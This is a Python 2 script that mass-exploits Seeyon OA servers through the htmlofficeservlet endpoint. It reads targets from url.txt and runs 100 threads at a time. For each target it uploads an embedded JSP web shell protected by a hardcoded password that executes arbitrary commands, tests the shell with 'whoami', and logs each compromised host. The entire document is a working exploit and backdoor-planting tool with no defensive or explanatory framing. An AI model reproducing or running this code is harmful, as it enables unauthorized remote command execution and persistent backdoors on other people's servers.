#coding:utf-8
import requests
from tomorrow import threads
import urlparse

def opt2File(shellPath):
	try:
		f = open('result.txt','a')
		f.write(shellPath + '\n')
	finally:
		f.close()
@threads(100)
def Exp(website):
	uploadData = '''DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd3344".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce'''

	headers = {
		"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
		"Pragma": "no-cache",
	}
	parse_uri=urlparse.urlparse(website)
	host=parse_uri.netloc
	scheme=parse_uri.scheme
	wurl = scheme+'://' + host + '/seeyon/htmlofficeservlet'
	shellPath = scheme+'://' + host + '/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd+/c+whoami'
	try:
		q = requests.get(wurl,timeout=1)
	except:
		#print 'Can\'t visit' + wurl
		return
	try:
		hd = requests.get(shellPath,timeout=1)
		if hd.status_code == 200 and 'administrator' in hd.text:
			print 'you got a shell:'+shellPath
			opt2File(shellPath)
		else:
			TTTttt(wurl,shellPath,headers,uploadData,website)
	except:
		TTTttt(wurl,shellPath,headers,uploadData,website)
		return

def TTTttt(wurl,shellPath,headers,uploadData,website):
	try:
		r = requests.get(wurl, timeout=1)
		if r.status_code == 200 and 'DBSTEP' in r.text:
			res = requests.post(wurl, data=uploadData, headers=headers, timeout=1)
			getres = requests.get(shellPath, timeout=1)
			if getres.status_code == 200 and 'admin' in getres.text:
				print 'you got a shell:'+shellPath
				opt2File(shellPath)
		else:
			#print website + 'not vulnable'
			return
	except:
		#print website + ' Can\'t getshell'
		return

file = open("url.txt")
for text in file.readlines():
	data = text.strip('\n')
	Exp(data)